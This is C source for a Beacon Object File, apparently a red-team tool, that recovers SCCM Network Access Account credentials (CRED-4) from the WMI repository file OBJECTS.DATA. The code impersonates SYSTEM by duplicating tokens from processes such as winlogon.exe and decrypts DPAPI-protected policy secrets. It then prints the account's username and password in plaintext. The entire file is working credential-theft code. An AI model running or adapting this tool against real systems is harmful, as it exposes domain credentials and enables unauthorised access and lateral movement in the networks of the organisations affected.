/*
 * sccm-disk BOF — SCCM CRED-4 triage (on-disk OBJECTS.DATA)
 *
 * Parses the SCCM CIM repository (OBJECTS.DATA) and recovers the
 * CCM_NetworkAccessAccount PolicySecret blobs, decrypting them locally with
 * CryptUnprotectData as SYSTEM. Requires high integrity (admin).
 *
 * Self-contained port of sccm-bofs (src/bofs/sccm_disk.c + the disk/impersonation/
 * decrypt helpers it uses). The legacy manual DPAPI masterkey path is omitted:
 * the caller always passes a NULL masterkey cache, so only the direct
 * CryptUnprotectData (CRED_PROTECTED blob) path is exercised.
 */
#include "bofdefs.h"

#ifdef BOF
#include "beacon.h"
#else
#include <stdio.h>
#include <stdarg.h>
#define CALLBACK_OUTPUT 0x0
#define CALLBACK_ERROR  0x0d
static void BeaconPrintf(int type, const char* fmt, ...) {
    FILE* f = (type == CALLBACK_ERROR) ? stderr : stdout;
    va_list ap;
    va_start(ap, fmt);
    vfprintf(f, fmt, ap);
    va_end(ap);
}
#endif

#include <tlhelp32.h>

#ifdef BOF
DECLSPEC_IMPORT HANDLE  WINAPI KERNEL32$CreateToolhelp32Snapshot(DWORD, DWORD);
DECLSPEC_IMPORT BOOL    WINAPI KERNEL32$Process32FirstW(HANDLE, LPPROCESSENTRY32W);
DECLSPEC_IMPORT BOOL    WINAPI KERNEL32$Process32NextW(HANDLE, LPPROCESSENTRY32W);
#endif

static const BYTE SCCM_POLICY_OPEN[] = "<PolicySecret Version=\"1\"><![CDATA[";
static const BYTE SCCM_CDATA_CLOSE[] = "]]>";
static const BYTE SCCM_NAA_CLASS_TAG[] = "CCM_NetworkAccessAccount";
static const BYTE SCCM_NAA_USER_PROP[] = "NetworkAccessUsername";
static const BYTE SCCM_NAA_PASS_PROP[] = "NetworkAccessPassword";

/* ========================================================================
 * String and file helpers
 * ======================================================================== */

static BYTE* hex_to_bytes(const char* hex, int* out_len) {
    if (!hex || !out_len) return NULL;
    int slen = strlen(hex);
    if (slen % 2 != 0) return NULL;

    int blen = slen / 2;
    BYTE* bytes = (BYTE*)intAlloc(blen);
    if (!bytes) return NULL;

    for (int i = 0; i < blen; i++) {
        unsigned int val = 0;
        char tmp[3] = { hex[i * 2], hex[i * 2 + 1], 0 };
        for (int j = 0; j < 2; j++) {
            val <<= 4;
            char c = tmp[j];
            if (c >= '0' && c <= '9') val |= (c - '0');
            else if (c >= 'a' && c <= 'f') val |= (c - 'a' + 10);
            else if (c >= 'A' && c <= 'F') val |= (c - 'A' + 10);
            else { intFree(bytes); return NULL; }
        }
        bytes[i] = (BYTE)val;
    }
    *out_len = blen;
    return bytes;
}

static char* bytes_to_hex(const BYTE* data, int len) {
    if (!data || len <= 0) return NULL;
    char* hex = (char*)intAlloc(len * 2 + 1);
    if (!hex) return NULL;
    for (int i = 0; i < len; i++) {
        sprintf(hex + i * 2, "%02X", data[i]);
    }
    hex[len * 2] = 0;
    return hex;
}

static char* wide_to_utf8(const wchar_t* wstr) {
    if (!wstr) return NULL;
#ifdef BOF
    int len = KERNEL32$WideCharToMultiByte(CP_UTF8, 0, wstr, -1, NULL, 0, NULL, NULL);
    if (len <= 0) return NULL;
    char* str = (char*)intAlloc(len);
    if (!str) return NULL;
    KERNEL32$WideCharToMultiByte(CP_UTF8, 0, wstr, -1, str, len, NULL, NULL);
#else
    int len = WideCharToMultiByte(CP_UTF8, 0, wstr, -1, NULL, 0, NULL, NULL);
    if (len <= 0) return NULL;
    char* str = (char*)intAlloc(len);
    if (!str) return NULL;
    WideCharToMultiByte(CP_UTF8, 0, wstr, -1, str, len, NULL, NULL);
#endif
    return str;
}

static wchar_t* utf8_to_wide(const char* str) {
    if (!str) return NULL;
#ifdef BOF
    int len = KERNEL32$MultiByteToWideChar(CP_UTF8, 0, str, -1, NULL, 0);
    if (len <= 0) return NULL;
    wchar_t* wstr = (wchar_t*)intAlloc(len * sizeof(wchar_t));
    if (!wstr) return NULL;
    KERNEL32$MultiByteToWideChar(CP_UTF8, 0, str, -1, wstr, len);
#else
    int len = MultiByteToWideChar(CP_UTF8, 0, str, -1, NULL, 0);
    if (len <= 0) return NULL;
    wchar_t* wstr = (wchar_t*)intAlloc(len * sizeof(wchar_t));
    if (!wstr) return NULL;
    MultiByteToWideChar(CP_UTF8, 0, str, -1, wstr, len);
#endif
    return wstr;
}

static BOOL is_high_integrity(void) {
    HANDLE hToken = NULL;
    BOOL result = FALSE;

#ifdef BOF
    if (!ADVAPI32$OpenProcessToken(KERNEL32$GetCurrentProcess(), TOKEN_QUERY, &hToken))
        return FALSE;

    DWORD dwSize = 0;
    ADVAPI32$GetTokenInformation(hToken, TokenIntegrityLevel, NULL, 0, &dwSize);
    if (dwSize == 0) { KERNEL32$CloseHandle(hToken); return FALSE; }

    TOKEN_MANDATORY_LABEL* tml = (TOKEN_MANDATORY_LABEL*)intAlloc(dwSize);
    if (!tml) { KERNEL32$CloseHandle(hToken); return FALSE; }

    if (ADVAPI32$GetTokenInformation(hToken, TokenIntegrityLevel, tml, dwSize, &dwSize)) {
        DWORD* pCount = (DWORD*)ADVAPI32$GetSidSubAuthorityCount(tml->Label.Sid);
        DWORD integrity = *ADVAPI32$GetSidSubAuthority(tml->Label.Sid, *pCount - 1);
        result = (integrity >= SECURITY_MANDATORY_HIGH_RID);
    }

    intFree(tml);
    KERNEL32$CloseHandle(hToken);
#else
    if (!OpenProcessToken(GetCurrentProcess(), TOKEN_QUERY, &hToken))
        return FALSE;

    DWORD dwSize = 0;
    GetTokenInformation(hToken, TokenIntegrityLevel, NULL, 0, &dwSize);
    if (dwSize == 0) { CloseHandle(hToken); return FALSE; }

    TOKEN_MANDATORY_LABEL* tml = (TOKEN_MANDATORY_LABEL*)intAlloc(dwSize);
    if (!tml) { CloseHandle(hToken); return FALSE; }

    if (GetTokenInformation(hToken, TokenIntegrityLevel, tml, dwSize, &dwSize)) {
        PUCHAR pCount = GetSidSubAuthorityCount(tml->Label.Sid);
        DWORD integrity = *GetSidSubAuthority(tml->Label.Sid, (DWORD)*pCount - 1);
        result = (integrity >= SECURITY_MANDATORY_HIGH_RID);
    }

    intFree(tml);
    CloseHandle(hToken);
#endif

    return result;
}

static BOOL read_file_bytes(const wchar_t* path, BYTE** out_data, int* out_len) {
    HANDLE hFile;
    DWORD size, read;

    if (!path || !out_data || !out_len) return FALSE;
    *out_data = NULL;
    *out_len = 0;

#ifdef BOF
    hFile = KERNEL32$CreateFileW(path, GENERIC_READ,
                                  FILE_SHARE_READ | FILE_SHARE_WRITE | FILE_SHARE_DELETE,
                                  NULL,
                                  OPEN_EXISTING, 0, NULL);
    if (hFile == INVALID_HANDLE_VALUE) return FALSE;

    size = KERNEL32$GetFileSize(hFile, NULL);
    if (size == INVALID_FILE_SIZE || size == 0) {
        KERNEL32$CloseHandle(hFile);
        return FALSE;
    }

    *out_data = (BYTE*)intAlloc(size);
    if (!*out_data) {
        KERNEL32$CloseHandle(hFile);
        return FALSE;
    }

    if (!KERNEL32$ReadFile(hFile, *out_data, size, &read, NULL) || read != size) {
        intFree(*out_data);
        *out_data = NULL;
        KERNEL32$CloseHandle(hFile);
        return FALSE;
    }

    KERNEL32$CloseHandle(hFile);
#else
    hFile = CreateFileW(path, GENERIC_READ,
                        FILE_SHARE_READ | FILE_SHARE_WRITE | FILE_SHARE_DELETE,
                        NULL,
                        OPEN_EXISTING, 0, NULL);
    if (hFile == INVALID_HANDLE_VALUE) return FALSE;

    size = GetFileSize(hFile, NULL);
    if (size == INVALID_FILE_SIZE || size == 0) {
        CloseHandle(hFile);
        return FALSE;
    }

    *out_data = (BYTE*)intAlloc(size);
    if (!*out_data) {
        CloseHandle(hFile);
        return FALSE;
    }

    if (!ReadFile(hFile, *out_data, size, &read, NULL) || read != size) {
        intFree(*out_data);
        *out_data = NULL;
        CloseHandle(hFile);
        return FALSE;
    }

    CloseHandle(hFile);
#endif

    *out_len = (int)size;
    return TRUE;
}

static int find_bytes(const BYTE* data, int data_len,
                      int start, const BYTE* needle, int needle_len) {
    if (!data || !needle || data_len <= 0 || needle_len <= 0 || start < 0) return -1;
    if (start + needle_len > data_len) return -1;
    for (int i = start; i + needle_len <= data_len; i++) {
        if (memcmp(data + i, needle, needle_len) == 0) return i;
    }
    return -1;
}

static char* extract_ascii(const BYTE* data, int start, int end) {
    if (!data || start < 0 || end < start) return NULL;
    int len = end - start;
    if (len <= 0 || len > 16384) return NULL;
    char* out = (char*)intAlloc(len + 1);
    if (!out) return NULL;
    memcpy(out, data + start, len);
    out[len] = 0;
    return out;
}

static int find_bytes_in_range(const BYTE* data, int data_len, int start, int end,
                               const BYTE* needle, int needle_len) {
    int pos;

    if (!data || !needle || data_len <= 0 || needle_len <= 0) return -1;
    if (start < 0) start = 0;
    if (end > data_len) end = data_len;
    if (start >= end || start + needle_len > end) return -1;

    pos = find_bytes(data, data_len, start, needle, needle_len);
    if (pos < 0 || pos + needle_len > end) return -1;
    return pos;
}

static char* extract_policy_secret_hex_after(const BYTE* data, int data_len,
                                             int anchor, int end) {
    int open;
    int secret_start;
    int close;

    if (!data || data_len <= 0) return NULL;
    if (anchor < 0) anchor = 0;
    if (end > data_len) end = data_len;
    if (anchor >= end) return NULL;

    open = find_bytes_in_range(data, data_len, anchor, end,
                               SCCM_POLICY_OPEN, (int)(sizeof(SCCM_POLICY_OPEN) - 1));
    if (open < 0) return NULL;

    secret_start = open + (int)(sizeof(SCCM_POLICY_OPEN) - 1);
    close = find_bytes_in_range(data, data_len, secret_start, end,
                                SCCM_CDATA_CLOSE, (int)(sizeof(SCCM_CDATA_CLOSE) - 1));
    if (close < 0) return NULL;

    return extract_ascii(data, secret_start, close);
}
/* ========================================================================
 * Secret output helpers
 * ======================================================================== */

static BOOL looks_like_utf16le(const BYTE* data, int data_len) {
    if (!data || data_len < 4 || (data_len % 2) != 0) return FALSE;

    int pairs = data_len / 2;
    int high_zero = 0;
    int printable = 0;

    for (int i = 0; i < data_len; i += 2) {
        BYTE lo = data[i];
        BYTE hi = data[i + 1];
        if (hi == 0) high_zero++;
        if ((lo >= 0x20 && lo <= 0x7E) || lo == 0x09 || lo == 0x0A || lo == 0x0D)
            printable++;
    }

    return (high_zero >= (pairs * 6 / 10)) && (printable > 0);
}

static char* secret_bytes_to_utf8(const BYTE* data, int data_len) {
    int utf16_len;
    char* utf8;
    char* ascii;
    int trimmed;

    if (!data || data_len <= 0) return NULL;

    utf16_len = data_len;
    while (utf16_len >= 2 &&
           data[utf16_len - 2] == 0 &&
           data[utf16_len - 1] == 0) {
        utf16_len -= 2;
    }

    if (utf16_len > 0 &&
        (utf16_len % 2) == 0 &&
        looks_like_utf16le(data, utf16_len)) {
        wchar_t* wtmp = (wchar_t*)intAlloc(utf16_len + sizeof(wchar_t));
        if (!wtmp) return NULL;
        memcpy(wtmp, data, utf16_len);
        wtmp[utf16_len / 2] = L'\0';
        utf8 = wide_to_utf8(wtmp);
        intFree(wtmp);
        return utf8;
    }

    trimmed = data_len;
    while (trimmed > 0 && data[trimmed - 1] == 0) trimmed--;
    if (trimmed <= 0 || trimmed > 16384) return NULL;

    ascii = (char*)intAlloc(trimmed + 1);
    if (!ascii) return NULL;
    memcpy(ascii, data, trimmed);
    ascii[trimmed] = '\0';
    return ascii;
}

static void print_secret_value(const char* label, const BYTE* data, int data_len) {
    if (!label || !data || data_len <= 0) return;

    int utf16_len = data_len;
    while (utf16_len >= 2 &&
           data[utf16_len - 2] == 0 &&
           data[utf16_len - 1] == 0) {
        utf16_len -= 2;
    }

    if (utf16_len > 0 &&
        (utf16_len % 2) == 0 &&
        looks_like_utf16le(data, utf16_len)) {
        wchar_t* wtmp = (wchar_t*)intAlloc(utf16_len + sizeof(wchar_t));
        if (wtmp) {
            memcpy(wtmp, data, utf16_len);
            wtmp[utf16_len / 2] = L'\0';
            char* utf8 = wide_to_utf8(wtmp);
            if (utf8) {
                BeaconPrintf(CALLBACK_OUTPUT, "    %s : %s\n", label, utf8);
                intFree(utf8);
                intFree(wtmp);
                return;
            }
            intFree(wtmp);
        }
    }

    int trimmed = data_len;
    while (trimmed > 0 && data[trimmed - 1] == 0) trimmed--;
    if (trimmed <= 0) {
        BeaconPrintf(CALLBACK_OUTPUT, "    %s : <empty>\n", label);
        return;
    }

    char* hex = bytes_to_hex(data, trimmed);
    if (hex) {
        BeaconPrintf(CALLBACK_OUTPUT, "    %s (hex) : %s\n", label, hex);
        intFree(hex);
    }
}

static BOOL is_sccm_machine_account_value(const BYTE* data, int data_len) {
    static const BYTE marker[] = { 0x00, 0x00, 0x0E, 0x0E, 0x0E };

    if (!data || data_len < (int)sizeof(marker)) return FALSE;
    return (memcmp(data, marker, sizeof(marker)) == 0);
}

/* ========================================================================
 * Decrypt (direct CryptUnprotectData / CRED_PROTECTED blob path only)
 * ======================================================================== */

static BOOL decrypt_sccm_secret_hex(const char* secret_hex,
                                    BYTE** out_data, int* out_len) {
    if (!secret_hex || !out_data || !out_len) return FALSE;
    *out_data = NULL;
    *out_len = 0;

    int hex_len = (int)strlen(secret_hex);
    if (hex_len < 16 || (hex_len % 2) != 0 || hex_len > (1024 * 1024)) return FALSE;
    for (int i = 0; i < hex_len; i++) {
        char c = secret_hex[i];
        BOOL valid = ((c >= '0' && c <= '9') ||
                      (c >= 'a' && c <= 'f') ||
                      (c >= 'A' && c <= 'F'));
        if (!valid) return FALSE;
    }

    int raw_len = 0;
    BYTE* raw = hex_to_bytes(secret_hex, &raw_len);
    if (!raw || raw_len <= 0) return FALSE;

    for (int candidate = 0; candidate < 2; candidate++) {
        int off = (candidate == 0) ? 4 : 0;
        int len = raw_len - off;
        if (len < 44) continue;
        const BYTE* p = raw + off;
        if (*(DWORD*)p != 1) continue;
        if (!(p[4] == 0xD0 && p[5] == 0x8C && p[6] == 0x9D && p[7] == 0xDF)) continue;

        DATA_BLOB in;
        DATA_BLOB out;
        memset(&in, 0, sizeof(in));
        memset(&out, 0, sizeof(out));
        in.pbData = (BYTE*)p;
        in.cbData = (DWORD)len;

#ifdef BOF
        if (CRYPT32$CryptUnprotectData(&in, NULL, NULL, NULL, NULL, 0, &out) &&
            out.pbData && out.cbData > 0) {
            BYTE* copied = (BYTE*)intAlloc(out.cbData);
            if (copied) {
                memcpy(copied, out.pbData, out.cbData);
                *out_data = copied;
                *out_len = (int)out.cbData;
                KERNEL32$HeapFree(KERNEL32$GetProcessHeap(), 0, out.pbData);
                intFree(raw);
                return TRUE;
            }
            KERNEL32$HeapFree(KERNEL32$GetProcessHeap(), 0, out.pbData);
        }
#else
        if (CryptUnprotectData(&in, NULL, NULL, NULL, NULL, 0, &out) &&
            out.pbData && out.cbData > 0) {
            BYTE* copied = (BYTE*)intAlloc(out.cbData);
            if (copied) {
                memcpy(copied, out.pbData, out.cbData);
                *out_data = copied;
                *out_len = (int)out.cbData;
                HeapFree(GetProcessHeap(), 0, out.pbData);
                intFree(raw);
                return TRUE;
            }
            HeapFree(GetProcessHeap(), 0, out.pbData);
        }
#endif
    }

    intFree(raw);
    return FALSE;
}

static int triage_sccm_secret(const char* label,
                              const char* protected_hex,
                              BOOL* machine_account) {
    BYTE* decrypted = NULL;
    int decrypted_len = 0;
    BOOL ok = FALSE;

    if (!label) return 0;

    if (!protected_hex) {
        BeaconPrintf(CALLBACK_OUTPUT, "    [!] %s blob was not found\n", label);
        return 0;
    }

    ok = decrypt_sccm_secret_hex(protected_hex, &decrypted, &decrypted_len);
    if (ok) {
        char* text = secret_bytes_to_utf8(decrypted, decrypted_len);
        print_secret_value(label, decrypted, decrypted_len);
        if (text) {
            if (strstr(text, "<PolicyXML") && strstr(text, "Compression=\"zlib\"")) {
                BeaconPrintf(CALLBACK_OUTPUT,
                             "    [*] Decrypted SCCM policy XML uses zlib compression; BOF decompression is not implemented yet\n");
            }
            intFree(text);
        }
        if (machine_account && is_sccm_machine_account_value(decrypted, decrypted_len)) {
            *machine_account = TRUE;
        }
    } else {
        BeaconPrintf(CALLBACK_OUTPUT, "    [!] Failed to decrypt %s blob\n", label);
    }

    if (decrypted) intFree(decrypted);
    return ok ? 1 : 0;
}

/* ========================================================================
 * SYSTEM impersonation
 * ======================================================================== */

static BOOL is_local_system_sid(PSID sid) {
    static const BYTE nt_authority[6] = SECURITY_NT_AUTHORITY;
    SID* parsed_sid = (SID*)sid;

    if (!parsed_sid) return FALSE;
    if (parsed_sid->Revision != SID_REVISION) return FALSE;
    if (parsed_sid->SubAuthorityCount != 1) return FALSE;
    if (memcmp(parsed_sid->IdentifierAuthority.Value, nt_authority, sizeof(nt_authority)) != 0)
        return FALSE;

    return (parsed_sid->SubAuthority[0] == SECURITY_LOCAL_SYSTEM_RID);
}

static BOOL token_is_system(HANDLE token) {
    DWORD size = 0;
    BOOL result = FALSE;

    if (!token) return FALSE;

#ifdef BOF
    ADVAPI32$GetTokenInformation(token, TokenUser, NULL, 0, &size);
#else
    GetTokenInformation(token, TokenUser, NULL, 0, &size);
#endif
    if (size == 0) return FALSE;

    TOKEN_USER* user = (TOKEN_USER*)intAlloc(size);
    if (!user) return FALSE;

#ifdef BOF
    if (ADVAPI32$GetTokenInformation(token, TokenUser, user, size, &size)) {
#else
    if (GetTokenInformation(token, TokenUser, user, size, &size)) {
#endif
        result = is_local_system_sid(user->User.Sid);
    }

    intFree(user);
    return result;
}

static BOOL sccm_is_system(void) {
    HANDLE hToken = NULL;
    BOOL result = FALSE;

#ifdef BOF
    if (!ADVAPI32$OpenProcessToken(KERNEL32$GetCurrentProcess(), TOKEN_QUERY, &hToken))
        return FALSE;
    result = token_is_system(hToken);
    KERNEL32$CloseHandle(hToken);
#else
    if (!OpenProcessToken(GetCurrentProcess(), TOKEN_QUERY, &hToken))
        return FALSE;
    result = token_is_system(hToken);
    CloseHandle(hToken);
#endif

    return result;
}

static BOOL impersonate_system_process(const wchar_t* process_name) {
    HANDLE hSnapshot = INVALID_HANDLE_VALUE;
    PROCESSENTRY32W pe32;
    BOOL result = FALSE;

    if (!process_name) return FALSE;

    memset(&pe32, 0, sizeof(pe32));
    pe32.dwSize = sizeof(pe32);

#ifdef BOF
    hSnapshot = KERNEL32$CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
    if (hSnapshot == INVALID_HANDLE_VALUE) return FALSE;

    if (!KERNEL32$Process32FirstW(hSnapshot, &pe32)) {
        KERNEL32$CloseHandle(hSnapshot);
        return FALSE;
    }

    do {
        HANDLE hProcess = NULL;
        HANDLE hToken = NULL;
        HANDLE hDupToken = NULL;

        if (_wcsicmp(pe32.szExeFile, process_name) != 0) continue;

        hProcess = KERNEL32$OpenProcess(PROCESS_QUERY_LIMITED_INFORMATION, FALSE, pe32.th32ProcessID);
        if (!hProcess) hProcess = KERNEL32$OpenProcess(PROCESS_QUERY_INFORMATION, FALSE, pe32.th32ProcessID);
        if (!hProcess) continue;

        if (!ADVAPI32$OpenProcessToken(hProcess, TOKEN_DUPLICATE | TOKEN_IMPERSONATE | TOKEN_QUERY, &hToken))
            goto cleanup_process_bof;
        if (!token_is_system(hToken)) goto cleanup_process_bof;
        if (!ADVAPI32$DuplicateToken(hToken, SecurityImpersonation, &hDupToken))
            goto cleanup_process_bof;
        if (ADVAPI32$ImpersonateLoggedOnUser(hDupToken)) {
            result = TRUE;
        }

cleanup_process_bof:
        if (hDupToken) KERNEL32$CloseHandle(hDupToken);
        if (hToken) KERNEL32$CloseHandle(hToken);
        if (hProcess) KERNEL32$CloseHandle(hProcess);
        if (result) break;
    } while (KERNEL32$Process32NextW(hSnapshot, &pe32));

    KERNEL32$CloseHandle(hSnapshot);
#else
    hSnapshot = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
    if (hSnapshot == INVALID_HANDLE_VALUE) return FALSE;

    if (!Process32FirstW(hSnapshot, &pe32)) {
        CloseHandle(hSnapshot);
        return FALSE;
    }

    do {
        HANDLE hProcess = NULL;
        HANDLE hToken = NULL;
        HANDLE hDupToken = NULL;

        if (_wcsicmp(pe32.szExeFile, process_name) != 0) continue;

        hProcess = OpenProcess(PROCESS_QUERY_LIMITED_INFORMATION, FALSE, pe32.th32ProcessID);
        if (!hProcess) hProcess = OpenProcess(PROCESS_QUERY_INFORMATION, FALSE, pe32.th32ProcessID);
        if (!hProcess) continue;

        if (!OpenProcessToken(hProcess, TOKEN_DUPLICATE | TOKEN_IMPERSONATE | TOKEN_QUERY, &hToken))
            goto cleanup_process;
        if (!token_is_system(hToken)) goto cleanup_process;
        if (!DuplicateToken(hToken, SecurityImpersonation, &hDupToken))
            goto cleanup_process;
        if (ImpersonateLoggedOnUser(hDupToken)) {
            result = TRUE;
        }

cleanup_process:
        if (hDupToken) CloseHandle(hDupToken);
        if (hToken) CloseHandle(hToken);
        if (hProcess) CloseHandle(hProcess);
        if (result) break;
    } while (Process32NextW(hSnapshot, &pe32));

    CloseHandle(hSnapshot);
#endif

    return result;
}

static BOOL sccm_get_system_if_needed(BOOL* impersonated) {
    static const wchar_t* candidates[] = {
        L"winlogon.exe",
        L"services.exe",
        L"svchost.exe",
        L"spoolsv.exe"
    };

    if (impersonated) *impersonated = FALSE;

    if (sccm_is_system()) return TRUE;

    for (int i = 0; i < (int)(sizeof(candidates) / sizeof(candidates[0])); i++) {
        if (impersonate_system_process(candidates[i])) {
            if (impersonated) *impersonated = TRUE;
            return TRUE;
        }
    }

    BeaconPrintf(CALLBACK_ERROR,
                 "[!] Failed to impersonate SYSTEM; local SCCM DPAPI decrypt requires a SYSTEM token\n");
    return FALSE;
}

static void sccm_revert_if_needed(BOOL impersonated) {
    if (!impersonated) return;

#ifdef BOF
    ADVAPI32$RevertToSelf();
#else
    RevertToSelf();
#endif
}

/* ========================================================================
 * Disk (OBJECTS.DATA) CRED-4 triage
 * ======================================================================== */

static int triage_sccm_disk_naa(const BYTE* data, int data_len) {
    int pos = 0;
    int accounts = 0;
    int decrypted = 0;

    while (pos < data_len) {
        int class_pos;
        int next_class_pos;
        int region_end;
        int pass_prop_pos;
        int user_prop_pos;
        char* pass_hex = NULL;
        char* user_hex = NULL;
        BOOL machine_account = FALSE;

        class_pos = find_bytes(data, data_len, pos,
                               SCCM_NAA_CLASS_TAG, (int)(sizeof(SCCM_NAA_CLASS_TAG) - 1));
        if (class_pos < 0) break;

        next_class_pos = find_bytes(data, data_len,
                                    class_pos + (int)(sizeof(SCCM_NAA_CLASS_TAG) - 1),
                                    SCCM_NAA_CLASS_TAG, (int)(sizeof(SCCM_NAA_CLASS_TAG) - 1));
        region_end = data_len;
        if (next_class_pos >= 0 && next_class_pos < region_end) region_end = next_class_pos;
        if (class_pos + 32768 < region_end) region_end = class_pos + 32768;

        pass_prop_pos = find_bytes_in_range(data, data_len, class_pos, region_end,
                                            SCCM_NAA_PASS_PROP, (int)(sizeof(SCCM_NAA_PASS_PROP) - 1));
        user_prop_pos = find_bytes_in_range(data, data_len, class_pos, region_end,
                                            SCCM_NAA_USER_PROP, (int)(sizeof(SCCM_NAA_USER_PROP) - 1));

        if (pass_prop_pos >= 0) {
            int pass_end = region_end;
            if (user_prop_pos > pass_prop_pos && user_prop_pos < pass_end) pass_end = user_prop_pos;
            pass_hex = extract_policy_secret_hex_after(data, data_len, pass_prop_pos, pass_end);
        }
        if (user_prop_pos >= 0) {
            user_hex = extract_policy_secret_hex_after(data, data_len, user_prop_pos, region_end);
        }

        if (!pass_hex || !user_hex) {
            if (!pass_hex) {
                pass_hex = extract_policy_secret_hex_after(data, data_len, class_pos, region_end);
            }
            if (!user_hex && pass_hex) {
                int first_open = find_bytes_in_range(data, data_len, class_pos, region_end,
                                                     SCCM_POLICY_OPEN, (int)(sizeof(SCCM_POLICY_OPEN) - 1));
                if (first_open >= 0) {
                    int after_first = first_open + (int)(sizeof(SCCM_POLICY_OPEN) - 1);
                    int first_close = find_bytes_in_range(data, data_len, after_first, region_end,
                                                          SCCM_CDATA_CLOSE, (int)(sizeof(SCCM_CDATA_CLOSE) - 1));
                    if (first_close >= 0) {
                        user_hex = extract_policy_secret_hex_after(data, data_len,
                                                                   first_close + (int)(sizeof(SCCM_CDATA_CLOSE) - 1),
                                                                   region_end);
                    }
                }
            }
        }

        if (pass_hex || user_hex) {
            accounts++;
            BeaconPrintf(CALLBACK_OUTPUT, "\n[*] Triaging SCCM Network Access Account #%d\n", accounts);
            decrypted += triage_sccm_secret("Plaintext NAA Username", user_hex, &machine_account);
            decrypted += triage_sccm_secret("Plaintext NAA Password", pass_hex, &machine_account);
            if (machine_account) {
                BeaconPrintf(CALLBACK_OUTPUT,
                             "    [!] SCCM is configured to use the client's machine account instead of an NAA\n");
            }
        }

        if (pass_hex) intFree(pass_hex);
        if (user_hex) intFree(user_hex);

        pos = class_pos + (int)(sizeof(SCCM_NAA_CLASS_TAG) - 1);
    }

    if (accounts == 0) {
        BeaconPrintf(CALLBACK_OUTPUT, "[*] Found 0 SCCM Network Access Account entries\n");
    }

    return decrypted;
}

static BOOL triage_sccm_disk(const wchar_t* target) {
    const wchar_t* objects_path = target;
    wchar_t default_path[] = L"C:\\Windows\\System32\\wbem\\Repository\\OBJECTS.DATA";

    if (!objects_path || wcslen(objects_path) == 0) {
        objects_path = default_path;
    }

    char* path_utf8 = wide_to_utf8(objects_path);
    BeaconPrintf(CALLBACK_OUTPUT, "[*] SCCM source file: %s\n", path_utf8 ? path_utf8 : "?");
    if (path_utf8) intFree(path_utf8);

    BYTE* data = NULL;
    int data_len = 0;
    if (!read_file_bytes(objects_path, &data, &data_len)) {
#ifdef BOF
        DWORD last_error = KERNEL32$GetLastError();
#else
        DWORD last_error = GetLastError();
#endif
        BeaconPrintf(CALLBACK_ERROR, "[!] Failed to read SCCM OBJECTS.DATA (Win32: %lu)\n",
                     last_error);
        return FALSE;
    }

    int decrypted = 0;

    decrypted += triage_sccm_disk_naa(data, data_len);

    BeaconPrintf(CALLBACK_OUTPUT,
                 "\n[*] SCCM disk triage complete: %d decrypted secrets\n",
                 decrypted);

    intFree(data);
    return (decrypted > 0);
}

/* ========================================================================
 * Entry point
 * ======================================================================== */

#ifdef BOF
void go(char* args, int args_len) {
    char* target_str = NULL;
    wchar_t* target = NULL;
    BOOL impersonated = FALSE;

    if (args_len > 0) {
        datap parser;
        BeaconDataParse(&parser, args, args_len);
        target_str = BeaconDataExtract(&parser, NULL);
    }

    if (!is_high_integrity()) {
        BeaconPrintf(CALLBACK_ERROR,
            "[!] SCCM disk triage requires high integrity (admin) context\n");
        return;
    }

    if (target_str && strlen(target_str) > 0) {
        target = utf8_to_wide(target_str);
        if (!target) {
            BeaconPrintf(CALLBACK_ERROR, "[!] Failed to convert /target path to UTF-16\n");
            return;
        }
    }

    BeaconPrintf(CALLBACK_OUTPUT, "\n=== DPAPI SCCM CRED-4 (BOF) ===\n");

    if (!sccm_get_system_if_needed(&impersonated)) {
        goto cleanup;
    }

    triage_sccm_disk(target);

cleanup:
    sccm_revert_if_needed(impersonated);
    if (target) intFree(target);
}
#else
int main(int argc, char** argv) {
    wchar_t* target = NULL;

    if (argc > 1) {
        target = utf8_to_wide(argv[1]);
        if (!target) {
            BeaconPrintf(CALLBACK_ERROR, "[!] Failed to convert target path to UTF-16\n");
            return 1;
        }
    }

    if (!is_high_integrity()) {
        BeaconPrintf(CALLBACK_ERROR,
            "[!] SCCM disk triage requires high integrity (admin) context\n");
        if (target) intFree(target);
        return 1;
    }

    BeaconPrintf(CALLBACK_OUTPUT, "\n=== DPAPI SCCM CRED-4 (BOF) ===\n");

    BOOL impersonated = FALSE;
    if (!sccm_get_system_if_needed(&impersonated)) {
        if (target) intFree(target);
        return 1;
    }

    triage_sccm_disk(target);

    sccm_revert_if_needed(impersonated);
    if (target) intFree(target);
    return 0;
}
#endif
